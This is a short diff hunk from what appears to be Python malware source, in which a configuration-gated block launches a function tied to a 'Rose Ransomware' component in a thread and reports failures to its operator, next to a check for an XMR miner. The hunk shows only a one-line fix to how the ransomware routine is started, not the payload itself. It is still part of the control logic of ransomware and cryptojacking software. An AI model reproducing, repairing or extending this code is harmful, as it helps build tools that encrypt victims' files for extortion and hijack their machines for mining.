@@ -3388,7 +3388,7 @@ if cc.get_xmr_miner():
 
 if cc.get_ransomware():
     try:
-        threading.Thread(target=ransomware.ransomware()).start()
+        threading.Thread(target=ransomware()).start()
     except Exception as e:
         send_error_notification(e, 'Rose Ransomware')
 
